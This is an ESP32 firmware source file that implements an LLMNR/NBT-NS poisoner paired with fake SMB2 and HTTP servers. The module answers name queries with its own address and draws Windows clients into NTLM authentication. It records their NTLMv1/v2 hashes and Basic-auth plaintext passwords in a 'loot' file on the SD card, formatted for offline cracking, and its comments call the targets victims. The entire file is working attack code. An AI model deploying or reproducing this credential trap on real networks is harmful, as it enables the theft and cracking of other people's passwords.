#include "responder.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <esp_random.h>
#include <mbedtls/base64.h>
#include <time.h>
#include <vector>

#include "../../config.h"

namespace {
    // ---- shared state -------------------------------------------------
    volatile bool g_running = false;
    TaskHandle_t g_poisonTask = nullptr;
    TaskHandle_t g_smbTask = nullptr;
    volatile uint32_t g_queriesAnswered = 0;

    WiFiUDP g_llmnr;   // UDP 5355, multicast 224.0.0.252
    WiFiUDP g_nbns;    // UDP 137
    WiFiServer g_smbServer(445);

    const char *LOOT_FILE = "/loot/responder_ntlm.txt";

    struct Capture {
        uint32_t time;
        String type;    // "ntlmv2" | "ntlmv1" | "basic"
        String user;
        String domain;
        String client;
        String hash;    // ready-to-crack line, or "user:pass" for basic
    };
    std::vector<Capture> g_captures;
    SemaphoreHandle_t g_mtx = nullptr;

    void appendLoot(const Capture &c) {
        if (!sdReady()) return;
        File f = SD.open(LOOT_FILE, FILE_APPEND);
        if (!f) return;
        f.println(c.hash); // one clean, directly-crackable line per capture
        f.close();
    }

    void addCapture(const Capture &c) {
        if (!g_mtx) g_mtx = xSemaphoreCreateMutex();
        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
        g_captures.push_back(c);
        if (g_mtx) xSemaphoreGive(g_mtx);
        appendLoot(c);
        Serial.printf("[RESPONDER] captured %s user=%s domain=%s client=%s\n",
                      c.type.c_str(), c.user.c_str(), c.domain.c_str(), c.client.c_str());
    }

    String toHex(const uint8_t *buf, size_t len) {
        String s;
        s.reserve(len * 2);
        const char *hexd = "0123456789abcdef";
        for (size_t i = 0; i < len; ++i) {
            s += hexd[(buf[i] >> 4) & 0xF];
            s += hexd[buf[i] & 0xF];
        }
        return s;
    }

    // -------------------------------------------------------------------
    // LLMNR / NBT-NS poisoning
    // -------------------------------------------------------------------

    // Reconstructs "label1.label2..." from a DNS-style QNAME, for logging.
    String decodeDnsName(const uint8_t *buf, int start, int totalLen) {
        String name;
        int pos = start;
        while (pos < totalLen && buf[pos] != 0) {
            int labelLen = buf[pos];
            pos++;
            if (pos + labelLen > totalLen) break;
            if (name.length()) name += '.';
            for (int i = 0; i < labelLen; ++i) name += (char)buf[pos + i];
            pos += labelLen;
        }
        return name;
    }

    void sendLlmnrReply(WiFiUDP &udp, const uint8_t *req, int len, IPAddress srcIp, uint16_t srcPort) {
        if (len < 12) return;
        int pos = 12;
        while (pos < len && req[pos] != 0) pos += req[pos] + 1;
        if (pos >= len) return;
        int qnameEnd = pos + 1;
        int questionLen = qnameEnd - 12 + 4;
        if (qnameEnd + 1 >= len) return; // need room to read QTYPE

        // Windows resolves names with parallel A and AAAA queries; replying
        // to AAAA with an A record gets silently ignored by strict clients,
        // so answer with the right record type either way (AAAA gets an
        // IPv4-mapped IPv6 address, ::ffff:a.b.c.d).
        uint16_t qtype = (req[qnameEnd] << 8) | req[qnameEnd + 1];
        bool wantAAAA = (qtype == 28);
        String qname = decodeDnsName(req, 12, len);

        uint8_t reply[12 + 256];
        int rdlen = wantAAAA ? 16 : 4;
        if ((size_t)(12 + questionLen + 12 + rdlen) > sizeof(reply)) return;

        memcpy(reply, req, 2);
        reply[2] = 0x80; reply[3] = 0x00;
        reply[4] = 0x00; reply[5] = 0x01;
        reply[6] = 0x00; reply[7] = 0x01;
        reply[8] = 0x00; reply[9] = 0x00;
        reply[10] = 0x00; reply[11] = 0x00;
        memcpy(reply + 12, req + 12, questionLen);

        int apos = 12 + questionLen;
        reply[apos++] = 0xC0; reply[apos++] = 0x0C;
        reply[apos++] = 0x00; reply[apos++] = wantAAAA ? 0x1C : 0x01;
        reply[apos++] = 0x00; reply[apos++] = 0x01;
        reply[apos++] = 0x00; reply[apos++] = 0x00; reply[apos++] = 0x00; reply[apos++] = 0x1E;
        reply[apos++] = (rdlen >> 8) & 0xFF; reply[apos++] = rdlen & 0xFF;

        IPAddress me = WiFi.localIP();
        if (wantAAAA) {
            for (int i = 0; i < 10; ++i) reply[apos++] = 0x00;
            reply[apos++] = 0xFF; reply[apos++] = 0xFF;
        }
        reply[apos++] = me[0]; reply[apos++] = me[1]; reply[apos++] = me[2]; reply[apos++] = me[3];

        udp.beginPacket(srcIp, srcPort);
        udp.write(reply, apos);
        udp.endPacket();
        g_queriesAnswered++;
        Serial.printf("[RESPONDER] LLMNR %s query for '%s' from %s -> answered with %s\n",
                      wantAAAA ? "AAAA" : "A", qname.c_str(), srcIp.toString().c_str(), me.toString().c_str());
    }

    // Reconstructs the NetBIOS name from its "first level encoding" (32
    // 'A'-'P' chars, two per original byte), for logging.
    String decodeNbnsName(const uint8_t *encoded32) {
        String name;
        for (int i = 0; i < 15; ++i) { // byte 15 is the service suffix, not part of the name
            uint8_t hi = encoded32[i * 2] - 'A';
            uint8_t lo = encoded32[i * 2 + 1] - 'A';
            uint8_t ch = (hi << 4) | lo;
            if (ch == ' ' || ch == 0) break;
            name += (char)ch;
        }
        return name;
    }

    void sendNbnsReply(WiFiUDP &udp, const uint8_t *req, int len, IPAddress srcIp, uint16_t srcPort) {
        if (len < 12 + 1 + 32 + 1 + 4) return;
        if (req[12] != 0x20) return;

        String qname = decodeNbnsName(req + 13);

        uint8_t reply[12 + 34 + 2 + 2 + 4 + 2 + 6];
        int p = 0;
        reply[p++] = req[0]; reply[p++] = req[1];
        reply[p++] = 0x85; reply[p++] = 0x00;
        reply[p++] = 0x00; reply[p++] = 0x00;
        reply[p++] = 0x00; reply[p++] = 0x01;
        reply[p++] = 0x00; reply[p++] = 0x00;
        reply[p++] = 0x00; reply[p++] = 0x00;

        memcpy(reply + p, req + 12, 34);
        p += 34;

        reply[p++] = 0x00; reply[p++] = 0x20;
        reply[p++] = 0x00; reply[p++] = 0x01;
        reply[p++] = 0x00; reply[p++] = 0x00; reply[p++] = 0x00; reply[p++] = 0x1E;
        reply[p++] = 0x00; reply[p++] = 0x06;
        reply[p++] = 0x00; reply[p++] = 0x00;

        IPAddress me = WiFi.localIP();
        reply[p++] = me[0]; reply[p++] = me[1]; reply[p++] = me[2]; reply[p++] = me[3];

        udp.beginPacket(srcIp, srcPort);
        udp.write(reply, p);
        udp.endPacket();
        g_queriesAnswered++;
        Serial.printf("[RESPONDER] NBT-NS query for '%s' from %s -> answered with %s\n",
                      qname.c_str(), srcIp.toString().c_str(), me.toString().c_str());
    }

    void poisonTask(void *) {
        uint8_t buf[512];
        while (g_running) {
            int n = g_llmnr.parsePacket();
            if (n > 0) {
                n = g_llmnr.read(buf, sizeof(buf));
                if (n > 0) sendLlmnrReply(g_llmnr, buf, n, g_llmnr.remoteIP(), g_llmnr.remotePort());
            }

            n = g_nbns.parsePacket();
            if (n > 0) {
                n = g_nbns.read(buf, sizeof(buf));
                if (n > 0) sendNbnsReply(g_nbns, buf, n, g_nbns.remoteIP(), g_nbns.remotePort());
            }

            vTaskDelay(pdMS_TO_TICKS(20));
        }
        g_poisonTask = nullptr;
        vTaskDelete(nullptr);
    }

    // -------------------------------------------------------------------
    // Shared NTLMSSP challenge/response handling (used by both the HTTP
    // trap and the SMB trap below)
    // -------------------------------------------------------------------

    // Unicode, request-target, NTLM, always-sign, server target type,
    // extended session security, target-info present, 128/56-bit.
    const uint32_t NTLM_FLAGS = 0xA08A8205u;

    uint8_t g_lastChallenge[8];

    void utf16le(const char *ascii, uint8_t *out, int &outLen) {
        outLen = 0;
        for (const char *p = ascii; *p; ++p) {
            out[outLen++] = (uint8_t)*p;
            out[outLen++] = 0x00;
        }
    }

    // Windows FILETIME: 100ns ticks since 1601-01-01, as used in the
    // MsvAvTimestamp AV_PAIR. Harmless if the clock isn't NTP-synced —
    // it's informational only, never validated by this trap.
    void writeFileTime(uint8_t out[8]) {
        uint64_t ft = ((uint64_t)time(nullptr) + 11644473600ULL) * 10000000ULL;
        for (int i = 0; i < 8; ++i) out[i] = (uint8_t)(ft >> (8 * i));
    }

    // Builds a Type2 challenge with a target-info AV_PAIR blob (domain,
    // computer name, timestamp, EOL) — enough for a compliant client to
    // compute and return an NTLMv2 response.
    int buildType2(uint8_t *out, size_t cap) {
        const char *domain = "WORKGROUP";
        const char *computer = "ESPJACK";

        uint8_t targetName[32]; int targetNameLen;
        utf16le(domain, targetName, targetNameLen);

        uint8_t avDomain[32]; int avDomainLen; utf16le(domain, avDomain, avDomainLen);
        uint8_t avComputer[32]; int avComputerLen; utf16le(computer, avComputer, avComputerLen);
        uint8_t avTime[8]; writeFileTime(avTime);

        uint8_t targetInfo[112];
        int ti = 0;
        targetInfo[ti++] = 0x02; targetInfo[ti++] = 0x00; // MsvAvNbDomainName
        targetInfo[ti++] = avDomainLen & 0xFF; targetInfo[ti++] = (avDomainLen >> 8) & 0xFF;
        memcpy(targetInfo + ti, avDomain, avDomainLen); ti += avDomainLen;

        targetInfo[ti++] = 0x01; targetInfo[ti++] = 0x00; // MsvAvNbComputerName
        targetInfo[ti++] = avComputerLen & 0xFF; targetInfo[ti++] = (avComputerLen >> 8) & 0xFF;
        memcpy(targetInfo + ti, avComputer, avComputerLen); ti += avComputerLen;

        targetInfo[ti++] = 0x07; targetInfo[ti++] = 0x00; // MsvAvTimestamp
        targetInfo[ti++] = 0x08; targetInfo[ti++] = 0x00;
        memcpy(targetInfo + ti, avTime, 8); ti += 8;

        targetInfo[ti++] = 0x00; targetInfo[ti++] = 0x00; // MsvAvEOL
        targetInfo[ti++] = 0x00; targetInfo[ti++] = 0x00;

        int total = 48 + targetNameLen + ti;
        if ((size_t)total > cap) return -1;

        memset(out, 0, total);
        memcpy(out, "NTLMSSP\0", 8);
        out[8] = 2;

        out[12] = targetNameLen & 0xFF; out[13] = (targetNameLen >> 8) & 0xFF;
        out[14] = targetNameLen & 0xFF; out[15] = (targetNameLen >> 8) & 0xFF;
        out[16] = 48; out[17] = 0; out[18] = 0; out[19] = 0;

        out[20] = NTLM_FLAGS & 0xFF; out[21] = (NTLM_FLAGS >> 8) & 0xFF;
        out[22] = (NTLM_FLAGS >> 16) & 0xFF; out[23] = (NTLM_FLAGS >> 24) & 0xFF;

        for (int i = 0; i < 8; ++i) g_lastChallenge[i] = (uint8_t)esp_random();
        memcpy(out + 24, g_lastChallenge, 8);

        int targetInfoOffset = 48 + targetNameLen;
        out[40] = ti & 0xFF; out[41] = (ti >> 8) & 0xFF;
        out[42] = ti & 0xFF; out[43] = (ti >> 8) & 0xFF;
        out[44] = targetInfoOffset & 0xFF; out[45] = (targetInfoOffset >> 8) & 0xFF;
        out[46] = (targetInfoOffset >> 16) & 0xFF; out[47] = (targetInfoOffset >> 24) & 0xFF;

        memcpy(out + 48, targetName, targetNameLen);
        memcpy(out + 48 + targetNameLen, targetInfo, ti);
        return total;
    }

    String asciiFromMaybeUtf16(const uint8_t *buf, int len) {
        bool unicode = len >= 2 && (len % 2 == 0);
        if (unicode) {
            for (int i = 1; i < len; i += 2) if (buf[i] != 0) { unicode = false; break; }
        }
        String s;
        if (unicode) {
            for (int i = 0; i < len; i += 2) s += (char)buf[i];
        } else {
            for (int i = 0; i < len; ++i) s += (char)buf[i];
        }
        return s;
    }

    struct Field { uint16_t len; uint32_t offset; };
    Field readField(const uint8_t *msg, int at) {
        Field f;
        f.len = msg[at] | (msg[at + 1] << 8);
        f.offset = msg[at + 4] | (msg[at + 5] << 8) | (msg[at + 6] << 16) | (msg[at + 7] << 24);
        return f;
    }

    // Locates the "NTLMSSP\0" signature within the first few bytes of a
    // buffer, tolerating an optional SPNEGO (GSS-API) wrapper some SMB
    // clients still prepend even when our NEGOTIATE offered no mechanism
    // list - rather than assuming the message starts at offset 0.
    int findNtlmssp(const uint8_t *buf, int len) {
        int limit = len - 8;
        if (limit > 32) limit = 32;
        for (int i = 0; i <= limit; ++i) {
            if (memcmp(buf + i, "NTLMSSP\0", 8) == 0) return i;
        }
        return -1;
    }

    // Parses an NTLMSSP Type3 (AUTHENTICATE) message and, if it carries a
    // usable NT response, records it. Shared by the HTTP and SMB traps.
    bool parseType3(const uint8_t *msgIn, int lenIn, const String &clientIp, const String &via) {
        int off = findNtlmssp(msgIn, lenIn);
        if (off < 0) return false;
        const uint8_t *msg = msgIn + off;
        int len = lenIn - off;
        if (len < 52) return false;
        if (msg[8] != 3) return false;

        Field ntField = readField(msg, 20);
        Field domField = readField(msg, 28);
        Field userField = readField(msg, 36);

        if (ntField.offset + ntField.len > (uint32_t)len) return false;
        if (domField.offset + domField.len > (uint32_t)len) return false;
        if (userField.offset + userField.len > (uint32_t)len) return false;
        if (ntField.len < 16) return false;

        String domain = asciiFromMaybeUtf16(msg + domField.offset, domField.len);
        String user = asciiFromMaybeUtf16(msg + userField.offset, userField.len);

        bool looksV2 = ntField.len > 24;
        const uint8_t *ntResp = msg + ntField.offset;
        String ntProofStr = toHex(ntResp, 16);
        String blob = toHex(ntResp + 16, ntField.len - 16);
        String challengeHex = toHex(g_lastChallenge, 8);

        Capture c;
        c.time = millis();
        c.client = clientIp + " (" + via + ")";
        c.user = user;
        c.domain = domain;
        if (looksV2) {
            c.type = "ntlmv2";
            c.hash = user + "::" + domain + ":" + challengeHex + ":" + ntProofStr + ":" + blob;
        } else {
            c.type = "ntlmv1";
            c.hash = user + "::" + domain + ":" + challengeHex + ":" + toHex(ntResp, ntField.len) + ":";
        }
        addCapture(c);
        return true;
    }

    // -------------------------------------------------------------------
    // SMB trap (TCP 445): a minimal SMB2 server that only ever gets as
    // far as NTLM authentication, then fails the login on purpose so the
    // client doesn't expect a working session afterward.
    // -------------------------------------------------------------------

    void put16(uint8_t *b, int off, uint16_t v) { b[off] = v & 0xFF; b[off + 1] = (v >> 8) & 0xFF; }
    void put32(uint8_t *b, int off, uint32_t v) {
        b[off] = v & 0xFF; b[off + 1] = (v >> 8) & 0xFF; b[off + 2] = (v >> 16) & 0xFF; b[off + 3] = (v >> 24) & 0xFF;
    }
    uint16_t get16(const uint8_t *b, int off) { return b[off] | (b[off + 1] << 8); }
    uint32_t get32(const uint8_t *b, int off) {
        return (uint32_t)b[off] | ((uint32_t)b[off + 1] << 8) | ((uint32_t)b[off + 2] << 16) | ((uint32_t)b[off + 3] << 24);
    }

    bool nbssWrite(WiFiClient &c, const uint8_t *buf, size_t len) {
        uint8_t hdr[4] = { 0x00, (uint8_t)((len >> 16) & 0xFF), (uint8_t)((len >> 8) & 0xFF), (uint8_t)(len & 0xFF) };
        c.write(hdr, 4);
        c.write(buf, len);
        return true;
    }
    int nbssRead(WiFiClient &c, uint8_t *buf, size_t cap, uint32_t timeoutMs = 4000) {
        uint32_t deadline = millis() + timeoutMs;
        while (c.available() < 4) { if (millis() > deadline || !c.connected()) return -1; delay(10); }
        uint8_t hdr[4]; c.read(hdr, 4);
        uint32_t len = ((uint32_t)hdr[1] << 16) | ((uint32_t)hdr[2] << 8) | hdr[3];
        if (len > cap) return -1;
        size_t got = 0;
        while (got < len) {
            if (millis() > deadline || !c.connected()) return -1;
            if (c.available()) { int n = c.read(buf + got, len - got); if (n > 0) got += n; }
            else delay(5);
        }
        return (int)len;
    }

    void smb2Header(uint8_t *h, uint16_t command, uint32_t status, uint64_t messageId, uint64_t sessionId) {
        memset(h, 0, 64);
        h[0] = 0xFE; h[1] = 'S'; h[2] = 'M'; h[3] = 'B';
        put16(h, 4, 64);
        put32(h, 8, status);
        put16(h, 12, command);
        h[13] = 0x01; // response flag
        put16(h, 14, 1);
        for (int i = 0; i < 8; ++i) h[24 + i] = (uint8_t)(messageId >> (8 * i));
        for (int i = 0; i < 8; ++i) h[40 + i] = (uint8_t)(sessionId >> (8 * i));
    }

    void handleSmbNegotiate(WiFiClient &c) {
        uint8_t pkt[64 + 65];
        smb2Header(pkt, 0x0000, 0, 0, 0);
        uint8_t *b = pkt + 64;
        memset(b, 0, 65);
        put16(b, 0, 65);         // StructureSize
        put16(b, 2, 0);          // SecurityMode: no signing required
        put16(b, 4, 0x0202);     // DialectRevision: SMB 2.0.2 (widest compatibility)
        for (int i = 0; i < 16; ++i) b[8 + i] = (uint8_t)esp_random(); // ServerGuid
        put32(b, 24, 0);         // Capabilities
        put32(b, 28, 65536); put32(b, 32, 65536); put32(b, 36, 65536);
        uint8_t ft[8]; writeFileTime(ft);
        memcpy(b + 40, ft, 8);   // SystemTime
        // SecurityBufferOffset/Length left at 0 - no SPNEGO blob offered.
        nbssWrite(c, pkt, sizeof(pkt));
    }

    // Returns the SMB2 header's Command field from a received message.
    //
    // SecurityBufferOffset/Length (MS-SMB2 2.2.5) are measured from the
    // start of the SMB2 header (byte 0 of 'req'), not from the start of
    // the body - so the buffer is at req+secOff, never req+64+secOff.
    bool handleSmbSessionSetup1(WiFiClient &c, const uint8_t *req, int reqLen, uint64_t &sessionIdOut) {
        if (reqLen < 64 + 24) return false;
        const uint8_t *rbody = req + 64;
        uint16_t secOff = get16(rbody, 12);
        uint16_t secLen = get16(rbody, 14);
        if (secOff + secLen > (uint32_t)reqLen || secLen < 12) return false;
        int ntOff = findNtlmssp(req + secOff, secLen);
        if (ntOff < 0) return false;
        const uint8_t *type1 = req + secOff + ntOff;
        if (type1[8] != 1) return false;

        uint8_t type2[160];
        int t2len = buildType2(type2, sizeof(type2));
        if (t2len < 0) return false;

        sessionIdOut = ((uint64_t)esp_random() << 32) | esp_random();
        if (sessionIdOut == 0) sessionIdOut = 1;

        uint8_t pkt[64 + 8 + 160];
        smb2Header(pkt, 0x0001, 0xC0000016 /*STATUS_MORE_PROCESSING_REQUIRED*/, 1, sessionIdOut);
        uint8_t *body = pkt + 64;
        memset(body, 0, 8);
        put16(body, 0, 9);          // StructureSize
        put16(body, 4, 64 + 8);     // SecurityBufferOffset
        put16(body, 6, t2len);      // SecurityBufferLength
        memcpy(pkt + 64 + 8, type2, t2len);
        nbssWrite(c, pkt, 64 + 8 + t2len);
        return true;
    }

    void handleSmbSessionSetup2(WiFiClient &c, const uint8_t *req, int reqLen, uint64_t sessionId, const String &clientIp) {
        if (reqLen >= 64 + 24) {
            const uint8_t *rbody = req + 64;
            uint16_t secOff = get16(rbody, 12);
            uint16_t secLen = get16(rbody, 14);
            if (secOff + secLen <= (uint32_t)reqLen) {
                parseType3(req + secOff, secLen, clientIp, "smb");
            }
        }
        uint8_t pkt[64 + 8];
        smb2Header(pkt, 0x0001, 0xC000006D /*STATUS_LOGON_FAILURE*/, 2, sessionId);
        memset(pkt + 64, 0, 8);
        put16(pkt + 64, 0, 9);
        nbssWrite(c, pkt, sizeof(pkt));
    }

    void smbServerTask(void *) {
        g_smbServer.begin();
        while (g_running) {
            WiFiClient client = g_smbServer.available();
            if (!client) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }

            String clientIp = client.remoteIP().toString();
            Serial.printf("[RESPONDER] SMB connection from %s\n", clientIp.c_str());
            uint8_t buf[1024];
            int n = nbssRead(client, buf, sizeof(buf), 3000);
            if (n >= 64 + 2 && get16(buf + 64, 0) >= 36) {
                handleSmbNegotiate(client);
                n = nbssRead(client, buf, sizeof(buf), 3000);
                uint64_t sessionId;
                if (n > 0 && handleSmbSessionSetup1(client, buf, n, sessionId)) {
                    n = nbssRead(client, buf, sizeof(buf), 3000);
                    if (n > 0) handleSmbSessionSetup2(client, buf, n, sessionId, clientIp);
                }
            }
            client.stop();
        }
        g_smbServer.end();
        g_smbTask = nullptr;
        vTaskDelete(nullptr);
    }

    // -------------------------------------------------------------------
    // HTTP trap (TCP 80): a minimal raw-socket HTTP/1.1 server. There is
    // no routing — every request gets the same NTLM/Basic challenge,
    // regardless of path, since the only way a victim lands here at all
    // is via the LLMNR/NBT-NS poisoning above.
    // -------------------------------------------------------------------

    WiFiServer g_httpServer(80);
    TaskHandle_t g_httpTask = nullptr;

    String readHttpRequest(WiFiClient &c, uint32_t timeoutMs = 3000) {
        String buf;
        uint32_t deadline = millis() + timeoutMs;
        while (millis() < deadline && c.connected()) {
            while (c.available()) {
                buf += (char)c.read();
                if (buf.length() > 4096 || buf.endsWith("\r\n\r\n")) return buf;
            }
            delay(5);
        }
        return buf;
    }

    // Case-insensitive header lookup; the returned value preserves the
    // original casing (important: NTLM/Basic payloads are base64).
    bool findHeader(const String &raw, const char *name, String &value) {
        String lower = raw; lower.toLowerCase();
        String needle(name); needle.toLowerCase();
        int pos = lower.indexOf(needle);
        if (pos < 0) return false;
        int valStart = pos + needle.length();
        while (valStart < (int)raw.length() && raw[valStart] == ' ') valStart++;
        int lineEnd = raw.indexOf('\r', valStart);
        if (lineEnd < 0) lineEnd = raw.length();
        value = raw.substring(valStart, lineEnd);
        value.trim();
        return true;
    }

    void httpTrapTask(void *) {
        g_httpServer.begin();
        while (g_running) {
            WiFiClient client = g_httpServer.available();
            if (!client) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }

            String clientIp = client.remoteIP().toString();
            Serial.printf("[RESPONDER] HTTP connection from %s\n", clientIp.c_str());
            String req = readHttpRequest(client);
            String auth;
            bool handled = false;

            if (findHeader(req, "Authorization:", auth)) {
                if (auth.startsWith("NTLM ")) {
                    String b64 = auth.substring(5);
                    uint8_t decoded[1024]; size_t outLen = 0;
                    int rc = mbedtls_base64_decode(decoded, sizeof(decoded), &outLen,
                                                    (const unsigned char *)b64.c_str(), b64.length());
                    if (rc == 0 && outLen >= 12 && decoded[8] == 1) {
                        uint8_t type2[256];
                        int t2len = buildType2(type2, sizeof(type2));
                        if (t2len > 0) {
                            unsigned char b64out[512]; size_t b64outLen = 0;
                            mbedtls_base64_encode(b64out, sizeof(b64out), &b64outLen, type2, t2len);
                            client.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM " +
                                         String((char *)b64out, b64outLen) +
                                         "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
                            handled = true;
                        }
                    } else if (rc == 0 && outLen >= 12 && decoded[8] == 3) {
                        parseType3(decoded, outLen, clientIp, "http");
                        client.print("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK");
                        handled = true;
                    }
                } else if (auth.startsWith("Basic ")) {
                    String b64 = auth.substring(6);
                    uint8_t decoded[256]; size_t outLen = 0;
                    int rc = mbedtls_base64_decode(decoded, sizeof(decoded) - 1, &outLen,
                                                    (const unsigned char *)b64.c_str(), b64.length());
                    if (rc == 0) {
                        decoded[outLen] = 0;
                        String pair((char *)decoded);
                        int colon = pair.indexOf(':');
                        Capture c;
                        c.time = millis();
                        c.client = clientIp + " (http)";
                        c.type = "basic";
                        c.user = colon >= 0 ? pair.substring(0, colon) : pair;
                        c.domain = "";
                        c.hash = pair;
                        addCapture(c);
                        client.print("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK");
                        handled = true;
                    }
                }
            }

            if (!handled) {
                client.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\n"
                              "Content-Length: 0\r\nConnection: close\r\n\r\n");
            }
            delay(5);
            client.stop();
        }
        g_httpServer.end();
        g_httpTask = nullptr;
        vTaskDelete(nullptr);
    }
}

namespace Responder {

bool start() {
    if (g_running) return false;
    if (WiFi.status() != WL_CONNECTED) return false;

    if (!g_llmnr.beginMulticast(IPAddress(224, 0, 0, 252), 5355)) {
        Serial.println("[RESPONDER] Failed to join LLMNR multicast group.");
        return false;
    }
    if (!g_nbns.begin(137)) {
        Serial.println("[RESPONDER] Failed to bind NBT-NS port 137.");
        g_llmnr.stop();
        return false;
    }

    g_queriesAnswered = 0;
    g_running = true;
    xTaskCreatePinnedToCore(poisonTask, "responder", 4096, nullptr, 1, &g_poisonTask, 0);
    xTaskCreatePinnedToCore(smbServerTask, "responder-smb", 6144, nullptr, 1, &g_smbTask, 1);
    xTaskCreatePinnedToCore(httpTrapTask, "responder-http", 6144, nullptr, 1, &g_httpTask, 1);
    Serial.println("[RESPONDER] LLMNR/NBT-NS poisoning + HTTP/SMB credential trap active.");
    return true;
}

void stop() {
    g_running = false;
    delay(50);
    g_llmnr.stop();
    g_nbns.stop();
}

bool isRunning() { return g_running; }

String status() {
    JsonDocument doc;
    doc["running"] = g_running;
    doc["queriesAnswered"] = g_queriesAnswered;

    JsonArray arr = doc["captures"].to<JsonArray>();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    for (auto &c : g_captures) {
        JsonObject o = arr.add<JsonObject>();
        o["time"] = c.time;
        o["type"] = c.type;
        o["user"] = c.user;
        o["domain"] = c.domain;
        o["client"] = c.client;
        o["hash"] = c.hash;
    }
    if (g_mtx) xSemaphoreGive(g_mtx);

    String out;
    serializeJson(doc, out);
    return out;
}

void clearCaptures() {
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_captures.clear();
    if (g_mtx) xSemaphoreGive(g_mtx);
}

} // namespace Responder
